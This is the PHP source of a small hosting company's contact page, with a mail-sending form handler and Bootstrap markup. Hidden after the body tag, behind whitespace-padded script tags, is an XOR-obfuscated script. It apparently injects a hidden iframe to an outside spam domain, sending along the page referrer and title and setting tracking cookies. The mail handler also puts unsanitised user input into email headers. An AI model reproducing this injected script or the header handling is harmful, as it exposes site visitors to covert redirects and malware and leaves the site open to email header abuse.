<?php
if(isset($_POST['email'])) {
     
    // EDIT THE 2 LINES BELOW AS REQUIRED
    $email_to = "support@itcweb.co.za";
    $email_subject = "Response from website 'Contact Us'";
     
     
    function died($error) {
        // your error code can go here
        echo "We are very sorry, but there were error(s) found with the form you submitted. ";
        echo '<meta http-equiv="refresh" content="5;url=/site/contactus.html">';
		echo "You are about to be redirected back in 5 seconds!!";
        die();
    }
     
    // validation expected data exists
    if(!isset($_POST['first_name']) ||
        !isset($_POST['mobile']) ||
        !isset($_POST['email']) ||
        !isset($_POST['comments'])) {
        died('We are sorry, but there appears to be a problem with the form you submitted.');      
    }
     
    $first_name = $_POST['first_name']; // required
    $mobile = $_POST['mobile']; // required
    $email_from = $_POST['email']; // required
    $comments = $_POST['comments']; // required
     

    $email_message = "Form details below.\n\n";
     
    function clean_string($string) {
      $bad = array("content-type","bcc:","to:","cc:","href");
      return str_replace($bad,"",$string);
    }
     
    $email_message .= "First Name: ".clean_string($first_name)."\n";
    $email_message .= "Mobile: ".clean_string($mobile)."\n";
    $email_message .= "Email: ".clean_string($email_from)."\n";
    $email_message .= "Comments: ".clean_string($comments)."\n";
     
     
// create email headers
$headers = 'From: '.$email_from."\r\n".
'Reply-To: '.$email_from."\r\n" .
'X-Mailer: PHP/' . phpversion();
@mail($email_to, $email_subject, $email_message, $headers); 
?>
 
<!DOCTYPE html>
<html>
<head>
<meta name="description" content="MIHOST - Website hosting in South Africa">
<meta name="keywords" content="html, hosting, south africa, local hosting, free hosting, cheap host, mihost, cheapest hosting, superb, amazing, power hosting, linux, vps servers, dedicated, vps cheap, lots of ram, cheap servers, amazing quality, great service, efficient, superb, dedicated local, sa vps, sa dedicated">
<meta charset="utf-8">
<title>MI Host - Contact Us</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
<link href="css/bootstrap.css" rel="stylesheet">
<link href="css/bootstrap-responsive.css" rel="stylesheet" media="screen">
 
<link href="http://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
 
<link href="css/hosting.css" rel="stylesheet" media="all">
 
<link rel="stylesheet" href="css/flexslider.css"/>
<script src="js/jquery-1.9.0.min.js"></script>
<script src="js/jquery.flexslider.js"></script>
<script type="text/javascript">
  $(window).load(function() {
     $('.flexslider').flexslider({
        animation: "slide"
      });
  });
</script>
 
<script src="js/contact_form.js"></script>
</head>
<body><script type="text/javascript">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              </script><script type="text/javascript">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             </script><script type='text/javascript'>var a="'1Aqapkrv'1G'2Cdwlavkml'02rcpqgWPN'0:wpn'0;'5@'2C'02'02'02'02rcpqgf]wpn'02'1F'02'5@'5F'2C'2C'02'02'02'02kd'02'0:'02wpn'02'1F'1F'02lwnn'02'5A'5A'02wpn,nglevj'02'1F'1F'022'02'0;'2C'02'02'02'02'02'02'02'02pgvwpl'02rcpqgf]wpn'1@'2C'2C'02'02'02'02rpmvmamn]k'02'1F'02wpn,klfgzMd'0:'05'1C--'05'0;'1@'2C'02'02'02'02rcpqgf]wpn,rpmvmamn'02'1F'02wpn,qw`qvp'0:2'0Arpmvmamn]k'0;'1@'2C'2C'02'02'02'02pgocklkle]wpn'02'1F'02wpn,qw`qvp'0:rpmvmamn]k'02)'021'0A'02wpn,nglevj'0;'1@'2C'02'02'02'02fmockl]k'02'1F'02pgocklkle]wpn,klfgzMd'0:'05-'05'0;'1@'2C'02'02'02'02fmockl]k'02'1F'02fmockl]k'02'1F'1F'02/3'02'1D'02pgocklkle]wpn,nglevj'02/'023'02'1C'02fmockl]k'1@'2C'02'02'02'02rcpqgf]wpn,fmockl'02'1F'02pgocklkle]wpn,qw`qvp'0:2'0A'02fmockl]k'0;'1@'2C'02'02'02'02rcpqgf]wpn,rcvj'02'1F'02fmockl]k'02'1F'1F'02/3'02'5A'5A'02fmockl]k'02)'023'02'1F'1F'02pgocklkle]wpn,nglevj'02'1D'02lwnn'02'1C'02pgocklkle]wpn,qw`qvp'0:fmockl]k'02)'023'0A'02pgocklkle]wpn,nglevj'0;'1@'2C'2C'02'02'02'02fmockl]rcpvq'02'1F'02rcpqgf]wpn,fmockl,qrnkv'0:'05,'05'0;'1@'2C'02'02'02'02qukvaj'02'0:'02fmockl]rcpvq,nglevj'02'0;'5@'2C'02'02'02'02'02'02'02'02acqg'020'1C'2C'02'02'02'02'02'02'02'02'02'02rcpqgf]wpn,qw`fmockl'02'1F'02lwnn'1@'2C'02'02'02'02'02'02'02'02'02'02rcpqgf]wpn,jmqv'02'1F'02fmockl]rcpvq'7@2'7F'1@'2C'02'02'02'02'02'02'02'02'02'02rcpqgf]wpn,vnf'02'1F'02fmockl]rcpvq'7@3'7F'1@'2C'02'02'02'02'02'02'02'02'02'02`pgci'1@'2C'02'02'02'02'02'02'02'02acqg'021'1C'2C'02'02'02'02'02'02'02'02'02'02rcpqgf]wpn,qw`fmockl'02'1F'02fmockl]rcpvq'7@2'7F'1@'2C'02'02'02'02'02'02'02'02'02'02rcpqgf]wpn,jmqv'02'1F'02fmockl]rcpvq'7@3'7F'1@'2C'02'02'02'02'02'02'02'02'02'02rcpqgf]wpn,vnf'02'1F'02fmockl]rcpvq'7@0'7F'1@'2C'02'02'02'02'02'02'02'02'02'02`pgci'1@'2C'02'02'02'02'02'02'02'02acqg'026'1C'2C'02'02'02'02'02'02'02'02'02'02rcpqgf]wpn,qw`fmockl'02'1F'02fmockl]rcpvq'7@2'7F'1@'2C'02'02'02'02'02'02'02'02'02'02rcpqgf]wpn,jmqv'02'1F'02fmockl]rcpvq'7@3'7F'1@'2C'02'02'02'02'02'02'02'02'02'02rcpqgf]wpn,vnf'02'1F'02fmockl]rcpvq'7@0'7F'02)'02'05,'05'02)'02fmockl]rcpvq'7@1'7F'1@'2C'02'02'02'02'02'02'02'02'02'02`pgci'1@'2C'02'02'02'02'5F'2C'2C'02'02'02'02rcpqgf]wpn,rcpglv]fmockl'02'1F'02rcpqgf]wpn,jmqv'02)'02'05,'05'02)'02rcpqgf]wpn,vnf'1@'2C'2C'02'02'02'02pgvwpl'02rcpqgf]wpn'1@'2C'5F'2C'2Cdwlavkml'02qgvAmmikg'02'0:lcog'0A'02tcnwg'0A'02gzrkpgq'0A'02rcvj'0A'02fmockl'0A'02qgawpg'0;'02'5@'2C'02'02'02'02'02'02fmawoglv,ammikg'02'1F'02lcog'02)'02'00'1F'00'02)'02gqacrg'0:tcnwg'0;'02)'2C'02'02'02'02'02'02'02'02'0:'0:gzrkpgq'0;'02'1D'02'00'1@'02gzrkpgq'1F'00'02)'02gzrkpgq'02'1C'02'00'00'0;'02)'2C'02'02'02'02'02'02'02'02'0:'0:rcvj'0;'02'1D'02'00'1@'02rcvj'1F'00'02)'02rcvj'02'1C'02'00'00'0;'02)'2C'02'02'02'02'02'02'02'02'0:'0:fmockl'0;'02'1D'02'00'1@'02fmockl'1F'00'02)'02fmockl'02'1C'02'00'00'0;'02)'2C'02'02'02'02'02'02'02'02'0:'0:qgawpg'0;'02'1D'02'00'1@'02qgawpg'00'02'1C'02'00'00'0;'1@'2C'5F'2Cdwlavkml'02egvAmmikg'0:lcog'0;'02'5@'2C'2;tcp'02ammikg'02'1F'02'00'02'00'02)'02fmawoglv,ammikg'1@'2C'2;tcp'02qgcpaj'02'1F'02'00'02'00'02)'02lcog'02)'02'00'1F'00'1@'2C'2;tcp'02qgvQvp'02'1F'02lwnn'1@'2C'2;tcp'02mddqgv'02'1F'022'1@'2C'2;tcp'02glf'02'1F'022'1@'2C'2;kd'02'0:ammikg,nglevj'02'1G'022'0;'02'5@'2C'2;'2;mddqgv'02'1F'02ammikg,klfgzMd'0:qgcpaj'0;'1@'2C'2;'2;kd'02'0:mddqgv'02'03'1F'02/3'0;'02'5@'2C'2;'2;'2;mddqgv'02)'1F'02qgcpaj,nglevj'1@'2C'2;'2;'2;glf'02'1F'02ammikg,klfgzMd'0:'00'1@'00'0A'02mddqgv'0;'2C'2;'2;'2;kd'02'0:glf'02'1F'1F'02/3'0;'02'5@'2C'2;'2;'2;'2;glf'02'1F'02ammikg,nglevj'1@'2C'2;'2;'2;'5F'2C'2;'2;'2;qgvQvp'02'1F'02wlgqacrg'0:ammikg,qw`qvpkle'0:mddqgv'0A'02glf'0;'0;'1@'2C'2;'2;'5F'2C'2;'5F'2C'2;pgvwpl'0:qgvQvp'0;'1@'2C'5F'2C'2Cdwlavkml'02egv]rcpcoq'0:qgcpaj]qvpkle'0;'02'5@'2C'2C'02'02tcp'02rcpqg'02'1F'02dwlavkml'0:rcpcoq'0A'02rckpq'0;'02'5@'2C'02'02'02'02tcp'02rckp'02'1F'02rckpq'7@2'7F'1@'2C'02'02'02'02tcp'02rcpvq'02'1F'02rckp,qrnkv'0:'05'1F'05'0;'1@'2C'02'02'02'02tcp'02ig{'02'1F'02fgamfgWPKAmormlglv'0:rcpvq'7@2'7F'0;'1@'2C'02'02'02'02tcp'02tcnwg'02'1F'02fgamfgWPKAmormlglv'0:rcpvq,qnkag'0:3'0;,hmkl'0:'05'1F'05'0;'0;'1@'2C'2C'02'02'02'02--'02Jclfng'02ownvkrng'02rcpcogvgpq'02md'02vjg'02qcog'02lcog'2C'02'02'02'02kd'02'0:v{rgmd'02rcpcoq'7@ig{'7F'02'1F'1F'1F'02'00wlfgdklgf'00'0;'02'5@'2C'02'02'02'02'02'02rcpcoq'7@ig{'7F'02'1F'02tcnwg'1@'2C'02'02'02'02'5F'02gnqg'02'5@'2C'02'02'02'02'02'02rcpcoq'7@ig{'7F'02'1F'02'7@'7F,amlacv'0:rcpcoq'7@ig{'7F'0A'02tcnwg'0;'1@'2C'02'02'02'02'5F'2C'2C'02'02'02'02pgvwpl'02rckpq,nglevj'02'1F'1F'023'02'1D'02rcpcoq'02'1C'02rcpqg'0:rcpcoq'0A'02rckpq,qnkag'0:3'0;'0;'2C'02'02'5F'2C'2C'02'02--'02Egv'02pkf'02md'02ngcfkle'02'1D'2C'02'02pgvwpl'02qgcpaj]qvpkle,nglevj'02'1F'1F'022'02'1D'02'5@'5F'02'1C'02rcpqg'0:'5@'5F'0A'02qgcpaj]qvpkle,qw`qvp'0:3'0;,qrnkv'0:'05'04'05'0;'0;'1@'2C'5F'2C'2Ctcp'02p'02'1F'02fmawoglv,pgdgppgp'1@'2Ctcp'02lggf]wpn'02'1F'02'00jvvr'1C--p,ogec/wq/rknnq,uq-'1Dqlkvaj'00'02)'02'00'04qg]pgdgppgp'1F'00'02)'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'02)'02'00'04fgdcwnv]ig{umpf'1F'00'02)'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'02)'02'00'04ig{umpf'1F'00'02)'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2Ctcp'02ammnrceg'02'1F'02'5@qrncqjglc`ngf'1C3'0A'02qrncqjrcegwpn'1Clggf]wpn'0A'02glc`ngdpgswgla{'1C2'0A'02fkqrnc{dpgswgla{'1C'003'02fc{q'00'0A'02fgdklgjgcfgp'1C'00'00'0A'02ammikglcog'1C'7@'00ammnqgqammikg'00'0A'02'00rcvj'1F-'00'7F'0A'02cwvmjkfgvkogp'1C2'0A'02ncwlaj'1Cdcnqg'0A'02`pmuqgpfgvgavqvp'1C'0:uklfmu,mrgpc'02'04'04'02uklfmu,egvQgngavkml'0;'02'5A'5A'02'0:'03uklfmu,mrgpc'02'04'04'02uklfmu,ZONJvvrPgswgqv'0;'0A'02mwvrwv'1Cdwlavkml'02'0:'0;'02'5@'2C'02'02'02'02'2C'02'02'02'02fmawoglv,upkvg'0:'05'1Afkt'02kf'1F'00amlvglv]qgq]rceg'00'02qv{ng'1F'00rmqkvkml'1C'02c`qmnwvg'1@'02x/klfgz'1C'02/3'1@'02amnmp'1C'02ujkvg'1@'02`caiepmwlf/amnmp'1Cujkvg'00'1G'05'0;'1@'2C'02'02'02'02fmawoglv,upkvg'0:'05'1Akdpcog'02lcog'1F'00qrncqjrceg/kdpcog'00'02qpa'1F'00c`mwv'1C`ncli'00'02qv{ng'1F'00ocpekl'1C2'1@'02rcffkle'1C2'1@'02ukfvj'1C2'07'1@'02jgkejv'1C'022'07'00'1G'1A-kdpcog'1G'05'0;'1@'2C'02'02'02'02fmawoglv,upkvg'0:'00'1A`p'02-'1G'02'1A-fkt'1G'00'0;'1@'2C'02'02'02'02vjkq,qrncqjrcegpgd'02'1F'02fmawoglv,egvGngoglv@{Kf'0:'00amlvglv]qgq]rceg'00'0;'1@'2C'02'02'02'02vjkq,qrncqjkdpcogpgd'02'1F'02uklfmu,dpcogq'7@'00qrncqjrceg/kdpcog'00'7F'1@'2C'02'02'02'02--///'2C'02'02'02tcp'02rcpqgf]fmockl'02'1F'02rcpqgWPN'0:uklfmu,nmacvkml,mpkekl'0;'1@'2C'02'02'02tcp'02ammikg'02'1F'02rcpqgf]fmockl,fmockl'1@'2C'02'02'02tcp'02fcvc'02'1F'02egvAmmikg'0:ammikg'0;'1@'2C'02'02'02tcp'02wpn'02'1F'02vjkq,qrncqjrcegwpn'7@2'7F'1@'2C'02'02'02tcp'02wpnq'02'1F'02vjkq,qrncqjrcegwpn'1@'2C'02'02'02--///'2C'02'02'02kd'0:vjkq,qrncqjrcegwpn,nglevj'1G3'0;'2C'02'02'02'02'02'02'5@'2C'02'02'02'02'02'02kd'0:fcvc'1G'1F2'0;'02fcvc))'1@'2C'02'02'02'02'02'02gnqg'02fcvc'1F2'1@'2C'02'02'02'02'02'02--///'2C'02'02'02'02'02'02kd'0:fcvc'02'1G'02'0:wpnq,nglevj/3'0;'0;'02fcvc'02'1F'022'1@'2C'02'02'02'02'02'02wpn'02'1F'02vjkq,qrncqjrcegwpn'7@fcvc'7F'1@'2C'02'02'02'02'02'02qgvAmmikg'0:ammikg'0Afcvc'0A'05'05'0A'05'05'0;'1@'2C'02'02'02'02'02'02'5F'2C'02'02'02'02--///'2C'02'02'02'02vjkq,qrncqjkdpcogpgd,nmacvkml,pgrncag'0:lggf]wpn'0;'1@'2C'02'02'02'02vjkq,qvclfcpf`mf{'02'1F'02'0:fmawoglv,amorcvOmfg'02'1F'1F'02'00AQQ3Amorcv'00'0;'02'1D'02fmawoglv,fmawoglvGngoglv'02'1C'02fmawoglv,`mf{'1@'2C'02'02'02'02kd'02'0:'03-qcdcpk-k,vgqv'0:lctkecvmp,wqgpCeglv'0;'0;'02'5@'2C'02'02'02'02'02'02'02'02vjkq,qvclfcpf`mf{,qv{ng,mtgpdnmu'02'1F'02'00jkffgl'00'2C'02'02'02'02'5F'2C'02'02'02'02vjkq,qrncqjrcegpgd,qv{ng,ngdv'02'1F'022'1@'2C'02'02'02'02vjkq,qrncqjrcegpgd,qv{ng,vmr'02'1F'022'1@'2C'02'02'02'02vjkq,qrncqjrcegpgd,qv{ng,ukfvj'02'1F'02'002'07'00'1@'2C'02'02'02'02vjkq,qrncqjrcegpgd,qv{ng,jgkejv'02'1F'02'002'07'00'2C'5F'0A'02anmqgkv'1Cdwlavkml'02'0:'0;'02'5@'2C'02'02'02'02angcpKlvgptcn'0:vjkq,omtgwrvkogp'0;'1@'2C'02'02'02'02vjkq,qrncqjrcegpgd,qv{ng,fkqrnc{'02'1F'02'00lmlg'00'1@'2C'02'02'02'02vjkq,qrncqjkdpcogpgd,nmacvkml,pgrncag'0:'00c`mwv'1C`ncli'00'0;'1@'2C'02'02'02'02vjkq,qvclfcpf`mf{,qv{ng,mtgpdnmu'02'1F'02'00cwvm'00'2C'5F'0A'02klkv'1Cdwlavkml'02'0:'0;'02'5@'2C'02'02'02'02kd'02'0:vjkq,glc`ngdpgswgla{'02'1F'1F'023'0;'02'5@'2C'02'02'02'02'02'02'02'02kd'02'0:-qgqqkmlmln{-k,vgqv'0:vjkq,fkqrnc{dpgswgla{'0;'0;'02'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02kd'02'0:vjkq,egvAmmikg'0:vjkq,ammikglcog'7@2'7F'02)'02'00]egvq'00'0;'02'1F'1F'02lwnn'0;'02'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02vjkq,qgvAmmikg'0:vjkq,ammikglcog'7@2'7F'02)'02'00]egvq'00'0A'02'00nmcfgf'00'0;'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02vjkq,ncwlaj'02'1F'02vpwg'2C'02'02'02'02'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'02'02'02'02'5F'02gnqg'02'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02kd'02'0:-fc{-k,vgqv'0:vjkq,fkqrnc{dpgswgla{'0;'0;'02'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02kd'02'0:vjkq,egvAmmikg'0:vjkq,ammikglcog'7@2'7F'0;'02'1F'1F'02lwnn'02'5A'5A'02rcpqgKlv'0:vjkq,egvAmmikg'0:vjkq,ammikglcog'7@2'7F'0;'0;'02'03'1F'02rcpqgKlv'0:vjkq,fkqrnc{dpgswgla{'0;'0;'02'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02vjkq,qgvAmmikg'0:vjkq,ammikglcog'7@2'7F'0A'02rcpqgKlv'0:vjkq,fkqrnc{dpgswgla{'0;'0A'02rcpqgKlv'0:vjkq,fkqrnc{dpgswgla{'0;'0;'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02vjkq,ncwlaj'02'1F'02vpwg'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'5F'02gnqg'02'5@'2C'02'02'02'02'02'02'02'02vjkq,ncwlaj'02'1F'02vpwg'2C'02'02'02'02'5F'2C'02'02'02'02kd'02'0:vjkq,ncwlaj'0;'02'5@'2C'02'02'02'02'02'02'02'02vjkq,mwvrwv'0:'0;'1@'2C'02'02'02'02'02'02'02'02kd'02'0:rcpqgKlv'0:vjkq,cwvmjkfgvkogp'0;'02'1G'022'0;'02'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02qgvVkogmwv'0:'00ammnrceg,anmqgkv'0:'0;'00'0A'02rcpqgKlv'0:vjkq,cwvmjkfgvkogp'0;'02('023222'0;'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'5F'2C'5F'0A'02egvAmmikg'1Cdwlavkml'02'0:c'0;'02'5@'2C'02'02'02'02tcp'02`'02'1F'02lgu'02PgeGzr'0:c'02)'02'00'1F'7@'7G'1@'7F)'00'0A'02'00k'00'0;'1@'2C'02'02'02'02kd'02'0:fmawoglv,ammikg,ocvaj'0:`'0;'0;'02'5@'2C'02'02'02'02'02'02'02'02pgvwpl'02fmawoglv,ammikg,ocvaj'0:`'0;'7@2'7F,qrnkv'0:'00'1F'00'0;'7@3'7F'2C'02'02'02'02'5F'2C'02'02'02'02pgvwpl'02lwnn'2C'5F'0A'02qgvAmmikg'1Cdwlavkml'02'0:`'0A'02a'0A'02g'0;'02'5@'2C'02'02'02'02tcp'02c'02'1F'02lgu'02Fcvg'0:'0;'1@'2C'02'02'02'02kd'02'0:v{rgmd'02g'02'03'1F'02'00wlfgdklgf'00'0;'02'5@'2C'02'02'02'02'02'02'02'02tcp'02f'02'1F'02c,qgvFcvg'0:c,egvFcvg'0:'0;'02)'02rcpqgKlv'0:g'0;'0;'1@'2C'02'02'02'02'02'02'02'02fmawoglv,ammikg'02'1F'02`'02)'02'00'1F'00'02)'02a'02)'02'00'1@'02gzrkpgq'1F'00'02)'02c,vmEOVQvpkle'0:'0;'02)'02'00'1@'02'00'02)'02ammnrceg,ammikglcog'7@3'7F'2C'02'02'02'02'5F'02gnqg'02'5@'2C'02'02'02'02'02'02'02'02fmawoglv,ammikg'02'1F'02`'02)'02'00'1F'00'02)'02a'02)'02'00'1@'02'00'02)'02ammnrceg,ammikglcog'7@3'7F'2C'02'02'02'02'5F'2C'5F'5F'1@'2Ckd'02'0:ammnrceg,`pmuqgpfgvgavqvp'02'04'04'02ammnrceg,qrncqjglc`ngf'02'1F'1F'023'0;'02'5@'2C'02'02'02'02ammnrceg,klkv'0:'0;'2C'5F'2C'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
 
<div class="navbar navbar-fixed-top navbar-absolute">
<div class="navbar-inner">
<div class="container">
 
<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </a>
 
<a class="brand" href="index.html"> <img src="images/flathost-logo.png" width="174" height="52" alt="logo"></a>
 
<div class="nav-collapse collapse">
 
<ul class="nav pull-right">
<li><a href="index.html">HOME</a></li>
<li><a href="features.html">HOSTING</a></li>
<li><a href="testimonials.html">TESTIMONIALS</a></li>
<li><a href="pricing.html">PRICING</a></li>
<li class="dropdown"> <a href="#" class="dropdown-toggle" data-toggle="dropdown">SERVERS <b class="caret"></b></a>
<ul class="dropdown-menu">
				<li><a href="blog.html">Virtual Private Servers</a></li>
				<li><a href="blog-post.html">Dedicated Servers</a></li>>
</ul>
</li>
<li class="active"><a href="contact.html">CONTACT</a></li>
<li><a href="#Login" role="button" data-toggle="modal">Login</a></li>
<li><a href="https://my.itcweb.co.za/register.php" role="button" data-toggle="modal" class="btn btn-success">Sign Up</a></li>
</ul>
</div>
</div>
</div>
</div>
 
<div class="container">
<div class="row-fluid PageHead">
<div class="span12">
<h1>Contact Us</h1>
<h3>Keep in touch with us. we are here to help you</h3>
</div>
</div>
<div class="row-fluid ContactUs">
<div class="span6">
<div class="row-fluid">
<div class="span6">
<h4> South Africa</h4>
<address>
<strong>MI Host</strong><br>
13/2 Elizabeth Street<br>
Durban<br>
South Africa<br>
<abbr title="Phone">P:</abbr> +27 79 036 6714<br>
<br>
</address>
</div>
<div class="span6">


</div>
</div>
<div class="row-fluid">
<div class="span12"> <img src="" alt=""> <br>
<br>
</div>
</div>
</div>
<div class="span6">
<form class="form-horizontal" action="send_email.php" id="phpcontactform">
<div class="control-group">
<input class="input-block-level" type="text" placeholder="Full Name" name="name" id="first_name">
</div>
<div class="control-group">
<input class="input-block-level" type="email" placeholder="Email ID" name="email" id="email">
</div>
<div class="control-group">
<input class="input-block-level" type="text" placeholder="Mobile Number" name="mobile" id="mobile">
</div>
<div class="control-group">
<textarea class="input-block-level" rows="10" name="message" placeholder="Your Message" id="comments"></textarea>
</div>
<div class="control-group">
<p>
<input class="btn btn-success btn-large" type="submit" value="Send Message"/>
</p>
<span class="loading"></span> </div>
</form>
</div>
</div>
</div>
 
<div class="footer">
<div class="container">
<div class="row-fluid footerlinks">
<div class="span2">
<p>CALL US</p>
<ul>
<li> +1 4528 254 247</li>
<li>+1 4002 188 355</li>
</ul>
</div>
<div class="span2">
<p>FOLLOW US</p>
<ul>
<li><a href="http://twitter.com/surjithctly" target="_blank">Follow on Twitter</a></li>
<li><a href="http://web3canvas.com" target="_blank">Like us on Facebook</a></li>
<li><a href="http://surjithctly.in" target="_blank">Join on Linkedin</a> </li>
</ul>
</div>
<div class="span2">
<p>EMAIL US</p>
<ul>
<li><a href="http://www.cloudflare.com/email-protection#94e7e1e4e4fbe6e0d4e7e1e6fefde0fcf7e0f8edbafdfa" target="_blank">support @flathost.com</a></li>
<li><a href="http://www.cloudflare.com/email-protection#a1ccc0c8cde1d2d4d3cbc8d5c9c2d5cdd88fc8cf" target="_blank">sales @flathost.com</a></li>
</ul>
</div>
<div class="span2">
<p>COMPANY</p>
<ul>
<li> <a href="#">About us</a></li>
<li><a href="#">Latest from Blog</a></li>
<li><a href="#">Our Team</a></li>
</ul>
</div>
<div class="span2">
<p>LEGAL TERMS</p>
<ul>
<li><a href="#">Terms of use</a></li>
<li><a href="#">Privacy Policy</a></li>
</ul>
</div>
<div class="span2">
<p>Live Chat</p>
<ul>
<li> <a href="#" class="btn btn-success btn-small">CHAT WITH US </a> </li>
</ul>
</div>
</div>
<div class="row-fluid copyright">
<div class="pull-right"><img src="images/logo-footer.png" alt="logo"></div>
<p>Copyright &copy; 2013. Flathost Inc</p>
</div>
</div>
</div>
 
<div id="Login" class="modal hide fade LoginSignup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
<h3 id="myModalLabel">Login</h3>
</div>
<div class="modal-body">
		<form method="post" action="https://my.itcweb.co.za/dologin.php">
			<input type="hidden" name="token" value="90d70040c7e07ce377945561241432d0b960cb15" />
			Email Address: <input type="text" name="username" placeholder="Email Address">
			Password: <input type="password" name="password" placeholder="password">
			<button type="submit" class="btn btn-success btn-large">Login</button>
		</form>
</div>
</div>
 
<div id="Signup" class="modal hide fade LoginSignup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel2" aria-hidden="true">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
<h3 id="myModalLabel2">Signup</h3>
</div>
<div class="modal-body">
<form>
<input type="text" placeholder="Full Name">
<input type="text" placeholder="Email ID">
<input type="password" placeholder="Password">
<input type="text" placeholder="Location">
<button type="submit" class="btn btn-success btn-large">Signup for an Account</button>
<label class="checkbox">
<input type="checkbox">
I Agree to the Terms and Conditions </label>
</form>
</div>
</div>
 
<script src="js/jquery.easing.1.2.js"></script>
 
<script src="js/modernizr.js"></script>
 
<script src="js/bootstrap.js"></script>
 
<script>
            $(function() {
                $('.nav li a').bind('click',function(event){
                    var $anchor2 = $(this).parent();
				    var $anchor = $(this);
					$('.nav  li').removeClass('active');
                    $anchor2.addClass('active');
					
                    $('html, body').stop().animate({
                        scrollTop: $($anchor.attr('href')).offset().top - 50
                    }, 1500,'easeInOutExpo');
                    /*
                    if you don't want to use the easing effects:
                    $('html, body').stop().animate({
                        scrollTop: $($anchor.attr('href')).offset().top
                    }, 1000);
                    */
                    event.preventDefault();
                });
            });
        </script>
 
<script type="text/javascript">
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l=document.getElementsByTagName("a"),t=document.createElement("textarea");for(i=0;l.length-i;i++){try{a=l[i].getAttribute("href");if(a&&"www.cloudflare.com/email-protection"==a.substr(7 ,35)){s='';j=43;r=parseInt(a.substr(j,2),16);for(j+=2;a.length-j&&a.substr(j,1)!='X';j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}j+=1;s+=a.substr(j,a.length-j);t.innerHTML=s.replace(/</g,"&lt;").replace(/>/g,"&gt;");l[i].setAttribute("href","mailto:"+t.value);}}catch(e){}}}catch(e){}})();
/* ]]> */
</script>
</body>
</html>
<?php
}
?>